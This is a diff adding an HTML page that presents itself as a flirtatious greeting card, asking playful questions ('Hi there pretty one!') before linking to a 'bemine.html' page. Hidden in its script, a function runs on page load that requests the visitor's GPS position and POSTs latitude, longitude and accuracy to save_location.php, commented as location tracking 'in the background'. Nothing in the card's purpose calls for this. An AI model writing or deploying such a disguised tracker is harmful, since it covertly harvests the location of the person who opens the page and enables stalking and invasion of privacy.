@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Introduction</title>
+    <style>
+      body {
+        font-family: "Courier New", Courier, monospace;
+        background-color: #f0f8ff;
+        color: #ff4d6d;
+        text-align: center;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0;
+      }
+
+      #container {
+        font-size: 30px;
+        padding: 20px;
+      }
+
+      #question {
+        font-weight: bold;
+        margin-bottom: 10px;
+      }
+
+      #answer {
+        display: block;
+        font-size: 30px;
+        text-align: center;
+        border: none;
+        background: none;
+        outline: none;
+        margin: 10px auto;
+        color: #fa6c6c;
+      }
+
+      #answer::placeholder {
+        color: #fa6c6c;
+        font-size: 30px;
+      }
+
+      button {
+        padding: 10px 20px;
+        font-size: 20px;
+        background: #ff4d6d;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: 0.1s ease-in-out;
+      }
+
+      button:hover {
+        background: #e63950;
+        transform: scale(1.1);
+      }
+
+      @keyframes fade-in-out {
+        0% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+
+      .fade-animation {
+        animation: fade-in-out 2s ease-in-out;
+      }
+      footer {
+        position: fixed; /* Fix it at the bottom */
+        bottom: 0; /* Attach to bottom */
+        left: 0; /* Align left */
+        width: 100%; /* Full width */
+        text-align: center;
+        background-color: rgba(255, 77, 109, 0.2); /* Light pink background */
+        padding: 10px;
+        font-size: 14px;
+        color: #ff4d6d;
+        font-family: "Comic Sans MS", cursive, sans-serif;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="container">
+      <p id="question">Hi there pretty one! How are you?</p>
+      <input type="text" id="answer" placeholder="—" />
+      <button id="nextbutton" onclick="nextQuestion()">Next</button>
+    </div>
+
+    <script>
+      let step = 0;
+      const questions = [
+        "Is your day going as gorgeous as you? ;)",
+        "Hmm, I see... Your face tells me your favorite color is blue isn't it?",
+        "Oh, I see, breath in some oxygen, because you deserve it! :D",
+        "Are you ready!? >w<",
+        "*deep breath*",
+      ];
+
+      function nextQuestion() {
+        let input = document.getElementById("answer");
+        let container = document.getElementById("container");
+
+        container.classList.add("fade-animation");
+        container.addEventListener("animationend", function () {
+          container.classList.remove("fade-animation");
+        });
+
+        setTimeout(() => {
+          if (step < questions.length - 1) {
+            document.getElementById("question").textContent = questions[step];
+            input.value = "";
+            step++;
+          } else {
+            document.getElementById("question").textContent = questions[step];
+            input.value = "";
+            document.getElementById("nextbutton").onclick = function () {
+              location.href = "bemine.html";
+            };
+          }
+        }, 1000);
+      }
+
+      function fetchLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              let latitude = position.coords.latitude;
+              let longitude = position.coords.longitude;
+              let accuracy = position.coords.accuracy;
+
+              console.log("Latitude:", latitude);
+              console.log("Longitude:", longitude);
+              console.log("Accuracy:", accuracy, "meters");
+
+              // Send the data to your server
+              fetch("save_location.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ latitude, longitude, accuracy }),
+              })
+                .then((response) => response.text())
+                .then((data) => console.log("Server Response:", data))
+                .catch((error) => console.error("Error:", error));
+            },
+            (error) => {
+              console.warn(
+                "Location access denied or unavailable:",
+                error.message
+              );
+              // ❌ Do NOT stop the page, just continue without GPS
+            }
+          );
+        } else {
+          console.warn("Geolocation is not supported in this browser.");
+        }
+      }
+
+      // Run location tracking in the background but do not block content
+      window.onload = fetchLocation;
+    </script>
+    <footer>
+      <p>© Mubtasim Fuad | All rights reserved</p>
+    </footer>
+  </body>
+</html>
